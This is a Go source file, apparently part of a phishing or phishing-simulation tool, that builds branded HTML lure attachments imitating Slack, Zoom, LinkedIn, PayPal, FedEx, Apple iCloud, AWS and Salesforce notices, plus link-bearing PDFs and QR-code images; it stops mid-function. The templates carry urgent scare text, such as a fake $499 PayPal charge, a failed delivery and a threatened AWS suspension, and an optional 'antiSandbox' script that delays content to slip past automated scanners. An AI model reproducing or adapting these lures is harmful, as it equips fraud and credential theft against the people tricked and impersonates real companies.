package service

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/png"
	"strings"
	"time"

	"github.com/boombuler/barcode"
	"github.com/boombuler/barcode/qr"
)

// v1.0.43 – 8 new branded attachment templates + PDF generation + QR code attachments

const (
	TemplateSlackNotification HTMLTemplateID = "slack_notification"
	TemplateZoomMeeting       HTMLTemplateID = "zoom_meeting"
	TemplateLinkedIn          HTMLTemplateID = "linkedin"
	TemplatePayPal            HTMLTemplateID = "paypal"
	TemplateFedEx             HTMLTemplateID = "fedex"
	TemplateAppleICloud       HTMLTemplateID = "apple_icloud"
	TemplateAWSAlert          HTMLTemplateID = "aws_alert"
	TemplateSalesforce        HTMLTemplateID = "salesforce"
)

// GetHTMLTemplatesV2 returns the new v1.0.43 branded templates
func GetHTMLTemplatesV2() []HTMLTemplateInfo {
	return []HTMLTemplateInfo{
		{ID: TemplateSlackNotification, Name: "Slack Notification", Description: "Slack workspace message notification with channel preview", Category: "collaboration", Brand: "Slack", Icon: "💬"},
		{ID: TemplateZoomMeeting, Name: "Zoom Meeting Invite", Description: "Zoom meeting invitation with join button and meeting details", Category: "collaboration", Brand: "Zoom", Icon: "📹"},
		{ID: TemplateLinkedIn, Name: "LinkedIn Message", Description: "LinkedIn InMail or connection request notification", Category: "social", Brand: "LinkedIn", Icon: "💼"},
		{ID: TemplatePayPal, Name: "PayPal Payment", Description: "PayPal payment receipt or unauthorized transaction alert", Category: "finance", Brand: "PayPal", Icon: "💳"},
		{ID: TemplateFedEx, Name: "FedEx Delivery", Description: "FedEx delivery notification with tracking details", Category: "shipping", Brand: "FedEx", Icon: "📦"},
		{ID: TemplateAppleICloud, Name: "Apple iCloud", Description: "Apple iCloud storage alert or Apple ID security notification", Category: "cloud", Brand: "Apple", Icon: "🍎"},
		{ID: TemplateAWSAlert, Name: "AWS Alert", Description: "AWS billing alert or root account security notification", Category: "cloud", Brand: "AWS", Icon: "☁️"},
		{ID: TemplateSalesforce, Name: "Salesforce CRM", Description: "Salesforce CRM notification with record details", Category: "business", Brand: "Salesforce", Icon: "📊"},
	}
}

// generateV2Template dispatches to the new v1.0.43 templates
func (ag *AttachmentGenerator) generateV2Template(req *HTMLTemplateRequest) (string, bool) {
	linkURL := escapeForHTML(req.LinkURL)
	docName := escapeForHTML(req.DocumentName)
	senderName := escapeForHTML(req.SenderName)
	senderEmail := escapeForHTML(req.SenderEmail)
	companyName := escapeForHTML(req.CompanyName)
	message := escapeForHTML(req.Message)

	antiSandbox := ""
	if req.AntiSandbox {
		antiSandbox = `<script>
		(function(){
			var start = Date.now();
			var check = setInterval(function(){
				if(Date.now() - start > 3000){
					clearInterval(check);
					document.getElementById('loading-overlay').style.display='none';
					document.getElementById('main-content').style.display='block';
				}
			}, 100);
		})();
		</script>`
	}

	switch req.TemplateID {
	case TemplateSlackNotification:
		return ag.templateSlack(linkURL, docName, senderName, senderEmail, companyName, message, antiSandbox), true
	case TemplateZoomMeeting:
		return ag.templateZoom(linkURL, senderName, senderEmail, companyName, message, antiSandbox), true
	case TemplateLinkedIn:
		return ag.templateLinkedIn(linkURL, senderName, senderEmail, message, antiSandbox), true
	case TemplatePayPal:
		return ag.templatePayPal(linkURL, senderName, senderEmail, message, antiSandbox), true
	case TemplateFedEx:
		return ag.templateFedEx(linkURL, docName, senderName, message, antiSandbox), true
	case TemplateAppleICloud:
		return ag.templateAppleICloud(linkURL, senderName, senderEmail, message, antiSandbox), true
	case TemplateAWSAlert:
		return ag.templateAWS(linkURL, senderEmail, message, antiSandbox), true
	case TemplateSalesforce:
		return ag.templateSalesforce(linkURL, docName, senderName, senderEmail, companyName, message, antiSandbox), true
	default:
		return "", false
	}
}

func escapeForHTML(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	return s
}

// --- Slack ---
func (ag *AttachmentGenerator) templateSlack(linkURL, docName, senderName, senderEmail, companyName, message, antiSandbox string) string {
	if companyName == "" {
		companyName = "Your Workspace"
	}
	if message == "" {
		message = "Hey, can you review this document? It needs your approval before end of day."
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Slack - New Message</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Lato,'Helvetica Neue',Arial,sans-serif;background:#1a1d21;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.3);max-width:500px;width:100%%;overflow:hidden}
.header{background:#4a154b;padding:16px 24px;display:flex;align-items:center;gap:10px}
.header span{color:#fff;font-size:18px;font-weight:700;letter-spacing:-.5px}
.workspace{padding:12px 24px;background:#f8f8f8;border-bottom:1px solid #e8e8e8;font-size:13px;color:#616061}
.workspace strong{color:#1d1c1d}
.body{padding:24px}
.msg{display:flex;gap:12px;margin-bottom:20px}
.msg .avatar{width:36px;height:36px;background:#4a154b;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;flex-shrink:0}
.msg .content .name{font-size:15px;font-weight:700;color:#1d1c1d}
.msg .content .name .time{font-size:12px;font-weight:400;color:#616061;margin-left:8px}
.msg .content .text{font-size:15px;color:#1d1c1d;line-height:1.5;margin-top:4px}
.attachment{border-left:4px solid #4a154b;padding:12px 16px;background:#f8f8f8;border-radius:0 4px 4px 0;margin:12px 0 20px 48px}
.attachment .title{font-size:14px;color:#1264a3;font-weight:700;text-decoration:none}
.attachment .desc{font-size:13px;color:#616061;margin-top:4px}
.btn{display:block;width:100%%;padding:12px;background:#4a154b;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:15px;font-weight:700}
.btn:hover{background:#611f69}
.footer{padding:14px 24px;border-top:1px solid #e8e8e8;text-align:center}
.footer p{font-size:11px;color:#616061}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><span>slack</span></div>
<div class="workspace"><strong>%s</strong> &middot; #general</div>
<div class="body">
<div class="msg">
<div class="avatar">%s</div>
<div class="content">
<div class="name">%s <span class="time">%s</span></div>
<div class="text">%s</div>
</div>
</div>
<div class="attachment">
<a href="%s" class="title">%s</a>
<div class="desc">Click to view the shared document</div>
</div>
<a href="%s" class="btn">Open in Slack</a>
</div>
<div class="footer"><p>&copy; %d Slack Technologies, LLC</p></div>
</div>
</body>
</html>`, antiSandbox, companyName, safeInitial(senderName), senderName,
		time.Now().Add(-15*time.Minute).Format("3:04 PM"), message,
		linkURL, docName, linkURL, time.Now().Year())
}

// --- Zoom ---
func (ag *AttachmentGenerator) templateZoom(linkURL, senderName, senderEmail, companyName, message, antiSandbox string) string {
	meetingTime := time.Now().Add(1 * time.Hour).Format("Monday, January 2, 2006 3:04 PM")
	meetingID := fmt.Sprintf("%d %d %d", time.Now().UnixMilli()%999+100, time.Now().UnixMilli()%9999+1000, time.Now().UnixMilli()%9999+1000)
	if message == "" {
		message = "Please join the meeting to discuss important project updates."
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Zoom Meeting Invitation</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f6f6f6;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1);max-width:480px;width:100%%;overflow:hidden}
.header{background:#2d8cff;padding:24px;text-align:center}
.header h1{color:#fff;font-size:20px;font-weight:600}
.header p{color:rgba(255,255,255,.85);font-size:14px;margin-top:4px}
.body{padding:28px 24px}
.detail{display:flex;align-items:flex-start;gap:12px;margin-bottom:16px}
.detail .icon{width:20px;height:20px;flex-shrink:0;margin-top:2px;color:#2d8cff}
.detail .label{font-size:12px;color:#747487;text-transform:uppercase;letter-spacing:.5px}
.detail .value{font-size:14px;color:#232333;font-weight:500;margin-top:2px}
.divider{height:1px;background:#e8e8ed;margin:20px 0}
.message-text{font-size:14px;color:#535362;line-height:1.6;margin-bottom:24px;padding:16px;background:#f8f9ff;border-radius:8px}
.join-btn{display:block;width:100%%;padding:14px;background:#2d8cff;color:#fff;text-align:center;text-decoration:none;border-radius:8px;font-size:16px;font-weight:600}
.join-btn:hover{background:#1a7ae8}
.meeting-id{text-align:center;margin-top:16px;font-size:13px;color:#747487}
.footer{padding:16px 24px;border-top:1px solid #e8e8ed;text-align:center}
.footer p{font-size:11px;color:#747487}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header">
<h1>Zoom Meeting</h1>
<p>You've been invited to a meeting</p>
</div>
<div class="body">
<div class="detail"><div class="icon">📅</div><div><div class="label">When</div><div class="value">%s</div></div></div>
<div class="detail"><div class="icon">👤</div><div><div class="label">Host</div><div class="value">%s (%s)</div></div></div>
<div class="detail"><div class="icon">🏢</div><div><div class="label">Organization</div><div class="value">%s</div></div></div>
<div class="divider"></div>
<div class="message-text">%s</div>
<a href="%s" class="join-btn">Join Zoom Meeting</a>
<p class="meeting-id">Meeting ID: %s</p>
</div>
<div class="footer"><p>&copy; %d Zoom Video Communications, Inc.</p></div>
</div>
</body>
</html>`, antiSandbox, meetingTime, senderName, senderEmail, companyName, message, linkURL, meetingID, time.Now().Year())
}

// --- LinkedIn ---
func (ag *AttachmentGenerator) templateLinkedIn(linkURL, senderName, senderEmail, message, antiSandbox string) string {
	if message == "" {
		message = "I came across your profile and was impressed by your experience. I'd like to discuss a potential opportunity that might be a great fit."
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>LinkedIn - New Message</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.08),0 4px 12px rgba(0,0,0,.05);max-width:480px;width:100%%;overflow:hidden}
.header{background:#0a66c2;padding:16px 24px;display:flex;align-items:center;gap:8px}
.header span{color:#fff;font-size:18px;font-weight:700}
.body{padding:28px 24px}
.profile{display:flex;align-items:center;gap:14px;margin-bottom:20px}
.profile .avatar{width:56px;height:56px;background:#0a66c2;border-radius:50%%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;font-weight:600}
.profile .info .name{font-size:16px;font-weight:600;color:#191919}
.profile .info .title{font-size:13px;color:#666;margin-top:2px}
.message-box{background:#f3f2ef;border-radius:8px;padding:16px;margin-bottom:24px;font-size:14px;color:#191919;line-height:1.6}
.btn{display:block;width:100%%;padding:12px;background:#0a66c2;color:#fff;text-align:center;text-decoration:none;border-radius:24px;font-size:16px;font-weight:600}
.btn:hover{background:#004182}
.footer{padding:16px 24px;border-top:1px solid #e0e0e0;text-align:center}
.footer p{font-size:11px;color:#666}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><span>Linked<span style="background:#fff;color:#0a66c2;padding:0 3px;border-radius:2px;margin-left:1px">in</span></span></div>
<div class="body">
<div class="profile">
<div class="avatar">%s</div>
<div class="info">
<div class="name">%s</div>
<div class="title">Sent you a message</div>
</div>
</div>
<div class="message-box">%s</div>
<a href="%s" class="btn">View Message</a>
</div>
<div class="footer"><p>&copy; %d LinkedIn Corporation, 1000 W Maude Ave, Sunnyvale, CA 94085</p></div>
</div>
</body>
</html>`, antiSandbox, safeInitial(senderName), senderName, message, linkURL, time.Now().Year())
}

// --- PayPal ---
func (ag *AttachmentGenerator) templatePayPal(linkURL, senderName, senderEmail, message, antiSandbox string) string {
	txnID := strings.ToUpper(fmt.Sprintf("%d", time.Now().UnixMilli()))
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>PayPal - Payment Notification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f5f7fa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.08);max-width:500px;width:100%%;overflow:hidden}
.header{padding:20px 24px;border-bottom:1px solid #eaebec}
.header .logo{font-size:24px;font-weight:700;color:#003087}
.header .logo span{color:#0070ba}
.body{padding:28px 24px}
.title{font-size:22px;font-weight:300;color:#2c2e2f;margin-bottom:20px}
.alert{background:#fef3cd;border:1px solid #ffc107;border-radius:4px;padding:14px;margin-bottom:20px;font-size:14px;color:#856404}
.details{background:#f8f9fa;border-radius:4px;padding:16px;margin-bottom:24px}
.detail-row{display:flex;justify-content:space-between;padding:8px 0;font-size:14px;border-bottom:1px solid #eee}
.detail-row:last-child{border-bottom:none}
.detail-row .label{color:#6c6c6c}
.detail-row .value{color:#2c2e2f;font-weight:500}
.btn{display:block;width:100%%;padding:14px;background:#0070ba;color:#fff;text-align:center;text-decoration:none;border-radius:24px;font-size:16px;font-weight:600}
.btn:hover{background:#005ea6}
.footer{padding:16px 24px;border-top:1px solid #eaebec;text-align:center}
.footer p{font-size:11px;color:#6c6c6c}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><div class="logo">Pay<span>Pal</span></div></div>
<div class="body">
<div class="title">You sent a payment of $499.00 USD</div>
<div class="alert">If you did not authorize this payment, please cancel it immediately to receive a full refund.</div>
<div class="details">
<div class="detail-row"><span class="label">Transaction ID</span><span class="value">%s</span></div>
<div class="detail-row"><span class="label">Date</span><span class="value">%s</span></div>
<div class="detail-row"><span class="label">Recipient</span><span class="value">Coinbase Global, Inc.</span></div>
<div class="detail-row"><span class="label">Amount</span><span class="value" style="color:#d32f2f;font-weight:700">$499.00 USD</span></div>
</div>
<a href="%s" class="btn">Cancel Payment</a>
</div>
<div class="footer"><p>&copy; %d PayPal, Inc. All rights reserved.</p></div>
</div>
</body>
</html>`, antiSandbox, txnID, time.Now().Format("January 2, 2006"), linkURL, time.Now().Year())
}

// --- FedEx ---
func (ag *AttachmentGenerator) templateFedEx(linkURL, docName, senderName, message, antiSandbox string) string {
	trackingNum := fmt.Sprintf("%d", time.Now().UnixMilli()%9999999999+1000000000)
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>FedEx - Delivery Notification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;max-width:500px;width:100%%;overflow:hidden}
.header{background:#4d148c;padding:20px 24px;display:flex;align-items:center;justify-content:space-between}
.header .logo{color:#fff;font-size:28px;font-weight:700}
.header .logo span{color:#ff6600}
.body{padding:28px 24px}
.status{display:flex;align-items:center;gap:10px;margin-bottom:20px}
.status .icon{width:40px;height:40px;background:#fff3e0;border-radius:50%%;display:flex;align-items:center;justify-content:center;font-size:20px}
.status .text{font-size:18px;font-weight:600;color:#ff6600}
.info-box{border:1px solid #e0e0e0;border-radius:4px;padding:16px;margin-bottom:24px}
.info-row{display:flex;justify-content:space-between;padding:8px 0;font-size:14px;border-bottom:1px solid #f0f0f0}
.info-row:last-child{border-bottom:none}
.info-row .label{color:#666}
.info-row .value{color:#333;font-weight:500}
.message{font-size:14px;color:#555;line-height:1.6;margin-bottom:24px}
.btn{display:block;width:100%%;padding:14px;background:#ff6600;color:#fff;text-align:center;text-decoration:none;font-size:15px;font-weight:700;border-radius:2px}
.btn:hover{background:#e55b00}
.footer{padding:16px 24px;background:#f2f2f2;text-align:center}
.footer p{font-size:11px;color:#666}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><div class="logo">Fed<span>Ex</span></div></div>
<div class="body">
<div class="status"><div class="icon">⚠️</div><div class="text">Delivery Attempt Failed</div></div>
<div class="info-box">
<div class="info-row"><span class="label">Tracking Number</span><span class="value">%s</span></div>
<div class="info-row"><span class="label">Scheduled Delivery</span><span class="value">%s</span></div>
<div class="info-row"><span class="label">Status</span><span class="value" style="color:#ff6600">Action Required</span></div>
</div>
<p class="message">We attempted to deliver your package but no one was available to sign. Please confirm your delivery address and schedule a redelivery to prevent your package from being returned.</p>
<a href="%s" class="btn">Schedule Redelivery</a>
</div>
<div class="footer"><p>&copy; %d FedEx. All rights reserved.</p></div>
</div>
</body>
</html>`, antiSandbox, trackingNum, time.Now().Add(24*time.Hour).Format("January 2, 2006"), linkURL, time.Now().Year())
}

// --- Apple iCloud ---
func (ag *AttachmentGenerator) templateAppleICloud(linkURL, senderName, senderEmail, message, antiSandbox string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Apple - iCloud Storage</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:18px;box-shadow:0 4px 16px rgba(0,0,0,.06);max-width:460px;width:100%%;overflow:hidden}
.header{padding:32px 28px 0;text-align:center}
.header .apple-logo{font-size:44px;color:#1d1d1f;margin-bottom:8px}
.body{padding:20px 32px 36px;text-align:center}
.title{font-size:24px;font-weight:600;color:#1d1d1f;margin-bottom:12px}
.subtitle{font-size:15px;color:#86868b;line-height:1.6;margin-bottom:28px}
.storage-bar{background:#e5e5ea;border-radius:6px;height:8px;margin-bottom:8px;overflow:hidden}
.storage-fill{background:linear-gradient(90deg,#ff3b30,#ff9500);height:100%%;width:95%%;border-radius:6px}
.storage-text{font-size:12px;color:#86868b;margin-bottom:28px}
.btn{display:inline-block;padding:12px 32px;background:#0071e3;color:#fff;text-decoration:none;border-radius:22px;font-size:16px;font-weight:400}
.btn:hover{background:#0077ed}
.footer{padding:20px 28px;text-align:center;border-top:1px solid #f5f5f7}
.footer p{font-size:11px;color:#86868b}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><div class="apple-logo"></div></div>
<div class="body">
<div class="title">Your iCloud storage is almost full.</div>
<div class="subtitle">You've used 4.8 GB of 5 GB. Your photos, videos, and documents will no longer back up to iCloud.</div>
<div class="storage-bar"><div class="storage-fill"></div></div>
<div class="storage-text">4.8 GB of 5 GB used</div>
<a href="%s" class="btn">Upgrade Storage</a>
</div>
<div class="footer"><p>Apple ID: %s<br>&copy; %d Apple Inc. All rights reserved.</p></div>
</div>
</body>
</html>`, antiSandbox, linkURL, senderEmail, time.Now().Year())
}

// --- AWS ---
func (ag *AttachmentGenerator) templateAWS(linkURL, senderEmail, message, antiSandbox string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>AWS - Billing Alert</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Amazon Ember',Helvetica,Arial,sans-serif;background:#f2f3f3;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;max-width:520px;width:100%%;border-top:4px solid #ff9900;overflow:hidden}
.header{padding:20px 24px;border-bottom:1px solid #eaeded;display:flex;align-items:center;gap:10px}
.header .logo{font-size:28px;font-weight:700;color:#232f3e}
.body{padding:28px 24px}
.title{font-size:20px;font-weight:700;color:#0f1111;margin-bottom:16px}
.alert{background:#fff4e6;border-left:4px solid #ff9900;padding:14px;margin-bottom:20px;font-size:14px;color:#0f1111}
.details{border:1px solid #eaeded;border-radius:4px;padding:16px;margin-bottom:24px}
.detail-row{display:flex;justify-content:space-between;padding:8px 0;font-size:14px;border-bottom:1px solid #f0f0f0}
.detail-row:last-child{border-bottom:none}
.detail-row .label{color:#555}
.detail-row .value{color:#0f1111;font-weight:500}
.btn{display:inline-block;padding:10px 20px;background:#ff9900;color:#111;text-decoration:none;font-weight:700;border-radius:2px;font-size:14px}
.btn:hover{background:#ec8d00}
.footer{padding:16px 24px;background:#f2f3f3;font-size:11px;color:#555}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><div class="logo">aws</div></div>
<div class="body">
<div class="title">Action Required: Billing Alert</div>
<div class="alert"><strong>Important:</strong> If payment is not received within 48 hours, your AWS services may be suspended.</div>
<div class="details">
<div class="detail-row"><span class="label">Account</span><span class="value">%s</span></div>
<div class="detail-row"><span class="label">Outstanding Balance</span><span class="value" style="color:#d32f2f;font-weight:700">$142.50 USD</span></div>
<div class="detail-row"><span class="label">Due Date</span><span class="value">%s</span></div>
<div class="detail-row"><span class="label">Status</span><span class="value" style="color:#ff9900">Payment Failed</span></div>
</div>
<a href="%s" class="btn">Update Payment Method</a>
</div>
<div class="footer"><p>Amazon Web Services, Inc. is a subsidiary of Amazon.com, Inc.</p></div>
</div>
</body>
</html>`, antiSandbox, senderEmail, time.Now().Add(48*time.Hour).Format("January 2, 2006"), linkURL)
}

// --- Salesforce ---
func (ag *AttachmentGenerator) templateSalesforce(linkURL, docName, senderName, senderEmail, companyName, message, antiSandbox string) string {
	if message == "" {
		message = "A new opportunity has been assigned to you and requires immediate attention."
	}
	if docName == "" {
		docName = "Enterprise Deal - Q3 Renewal"
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Salesforce - CRM Notification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f3f3f3;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);max-width:500px;width:100%%;overflow:hidden}
.header{background:#032d60;padding:16px 24px;display:flex;align-items:center;gap:10px}
.header .logo{color:#fff;font-size:18px;font-weight:700}
.header .cloud{color:#00a1e0;font-size:18px;font-weight:700}
.body{padding:28px 24px}
.badge{display:inline-block;background:#e8f4fd;color:#0070d2;padding:4px 12px;border-radius:12px;font-size:12px;font-weight:600;margin-bottom:16px}
.title{font-size:18px;font-weight:600;color:#16325c;margin-bottom:16px}
.record{border:1px solid #d8dde6;border-radius:4px;overflow:hidden;margin-bottom:24px}
.record .row{display:flex;border-bottom:1px solid #d8dde6;font-size:13px}
.record .row:last-child{border-bottom:none}
.record .row .label{width:140px;padding:10px 12px;background:#f4f6f9;color:#54698d;font-weight:500;flex-shrink:0}
.record .row .value{padding:10px 12px;color:#16325c;flex:1}
.btn{display:block;width:100%%;padding:12px;background:#0070d2;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:14px;font-weight:600}
.btn:hover{background:#005fb2}
.footer{padding:14px 24px;border-top:1px solid #d8dde6;text-align:center}
.footer p{font-size:11px;color:#54698d}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><span class="logo">salesforce</span><span class="cloud"> ☁</span></div>
<div class="body">
<div class="badge">New Assignment</div>
<div class="title">%s</div>
<div class="record">
<div class="row"><div class="label">Opportunity</div><div class="value">%s</div></div>
<div class="row"><div class="label">Assigned By</div><div class="value">%s</div></div>
<div class="row"><div class="label">Account</div><div class="value">%s</div></div>
<div class="row"><div class="label">Stage</div><div class="value" style="color:#04844b;font-weight:600">Negotiation</div></div>
<div class="row"><div class="label">Close Date</div><div class="value">%s</div></div>
</div>
<a href="%s" class="btn">View in Salesforce</a>
</div>
<div class="footer"><p>&copy; %d Salesforce, Inc. All rights reserved.</p></div>
</div>
</body>
</html>`, antiSandbox, message, docName, senderName, companyName,
		time.Now().Add(30*24*time.Hour).Format("January 2, 2006"), linkURL, time.Now().Year())
}

// --- PDF Generation ---

// GeneratePDFAttachment generates a simple PDF document with embedded link.
// Uses HTML-to-PDF via go-rod headless browser if available, otherwise generates
// a minimal valid PDF with the link text.
func (ag *AttachmentGenerator) GeneratePDFAttachment(req *AttachmentGenerateRequest) (*GeneratedAttachment, error) {
	title := req.Data["title"]
	if title == "" {
		title = "Document"
	}
	body := req.Data["body"]
	if body == "" {
		body = "Please review the attached document by clicking the link below."
	}
	linkURL := req.LinkURL
	if linkURL == "" {
		linkURL = "#"
	}
	filename := req.Filename
	if filename == "" {
		filename = "document.pdf"
	}

	// Generate a minimal valid PDF with embedded link
	pdfBytes := generateMinimalPDF(title, body, linkURL)

	ag.Logger.Infow("generated PDF attachment",
		"filename", filename,
		"size", len(pdfBytes),
	)

	return &GeneratedAttachment{
		Filename:    filename,
		ContentType: "application/pdf",
		Content:     base64.StdEncoding.EncodeToString(pdfBytes),
		Size:        len(pdfBytes),
	}, nil
}

// generateMinimalPDF creates a valid PDF 1.4 document with title, body text, and a clickable URI link.
func generateMinimalPDF(title, body, linkURL string) []byte {
	var buf bytes.Buffer

	// Escape PDF string special characters
	escTitle := pdfEscapeString(title)
	escBody := pdfEscapeString(body)
	escLink := pdfEscapeString(linkURL)

	// Word-wrap body text at ~80 chars
	bodyLines := pdfWordWrap(escBody, 80)

	// Calculate page dimensions
	pageWidth := 612  // US Letter
	pageHeight := 792
	margin := 72 // 1 inch

	// Build content stream
	var stream bytes.Buffer
	// Title
	fmt.Fprintf(&stream, "BT\n/F1 18 Tf\n%d %d Td\n(%s) Tj\nET\n", margin, pageHeight-margin-18, escTitle)
	// Body lines
	yPos := pageHeight - margin - 50
	for _, line := range bodyLines {
		fmt.Fprintf(&stream, "BT\n/F1 11 Tf\n%d %d Td\n(%s) Tj\nET\n", margin, yPos, line)
		yPos -= 16
	}
	// Link text
	yPos -= 20
	linkY := yPos
	fmt.Fprintf(&stream, "BT\n/F1 12 Tf\n0 0 0.8 rg\n%d %d Td\n(Click here to view document) Tj\nET\n", margin, linkY)
	streamContent := stream.String()

	// PDF objects
	// 1: Catalog
	// 2: Pages
	// 3: Page
	// 4: Font (Helvetica)
	// 5: Content stream
	// 6: Annotation (link)

	var offsets []int

	// Header
	buf.WriteString("%PDF-1.4\n")

	// Object 1: Catalog
	offsets = append(offsets, buf.Len())
	buf.WriteString("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

	// Object 2: Pages
	offsets = append(offsets, buf.Len())
	buf.WriteString("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

	// Object 3: Page
	offsets = append(offsets, buf.Len())
	fmt.Fprintf(&buf, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 %d %d] /Contents 5 0 R /Resources << /Font << /F1 4 0 R >> >> /Annots [6 0 R] >>\nendobj\n", pageWidth, pageHeight)

	// Object 4: Font
	offsets = append(offsets, buf.Len())
	buf.WriteString("4 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n")

	// Object 5: Content stream
	offsets = append(offsets, buf.Len())
	fmt.Fprintf(&buf, "5 0 obj\n<< /Length %d >>\nstream\n%s\nendstream\nendobj\n", len(streamContent), streamContent)

	// Object 6: Link annotation
	offsets = append(offsets, buf.Len())
	fmt.Fprintf(&buf, "6 0 obj\n<< /Type /Annot /Subtype /Link /Rect [%d %d %d %d] /Border [0 0 0] /A << /Type /Action /S /URI /URI (%s) >> >>\nendobj\n",
		margin, linkY-4, margin+200, linkY+14, escLink)

	// Cross-reference table
	xrefOffset := buf.Len()
	fmt.Fprintf(&buf, "xref\n0 %d\n", len(offsets)+1)
	buf.WriteString("0000000000 65535 f \n")
	for _, off := range offsets {
		fmt.Fprintf(&buf, "%010d 00000 n \n", off)
	}

	// Trailer
	fmt.Fprintf(&buf, "trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n", len(offsets)+1, xrefOffset)

	return buf.Bytes()
}

func pdfEscapeString(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "(", "\\(")
	s = strings.ReplaceAll(s, ")", "\\)")
	return s
}

func pdfWordWrap(text string, maxWidth int) []string {
	words := strings.Fields(text)
	var lines []string
	var current string
	for _, word := range words {
		if current == "" {
			current = word
		} else if len(current)+1+len(word) <= maxWidth {
			current += " " + word
		} else {
			lines = append(lines, current)
			current = word
		}
	}
	if current != "" {
		lines = append(lines, current)
	}
	return lines
}

// --- QR Code Attachment ---

// GenerateQRAttachment generates a QR code image as a PNG attachment
func (ag *AttachmentGenerator) GenerateQRAttachment(req *AttachmentGenerateRequest) (*GeneratedAttachment, error) {
	linkURL := req.LinkURL
	if linkURL == "" {
		return nil, fmt.Errorf("linkUrl is required for QR code generation")
	}
	filename := req.Filename
	if filename == "" {
		filename = "qrcode.png"
	}

	size := 300 // default QR size
	if sizeStr, ok := req.Data["size"]; ok {
		var s int
		if _, err := fmt.Sscanf(sizeStr, "%d", &s); err == nil && s > 0 && s <= 1000 {
			size = s
		}
	}

	// Generate QR code using boombuler/barcode (already a dependency)
	qrCode, err := qr.Encode(linkURL, qr.M, qr.Auto)
	if err != nil {
		return nil, fmt.Errorf("failed to encode QR code: %w", err)
	}
	qrCode, err = barcode.Scale(qrCode, size, size)
	if err != nil {
		return nil, fmt.Errorf("failed to scale QR code: %w", err)
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, qrCode); err != nil {
		return nil, fmt.Errorf("failed to encode QR PNG: %w", err)
	}

	ag.Logger.Infow("generated QR code attachment",
		"filename", filename,
		"size", buf.Len(),
		"url", linkURL,
	)

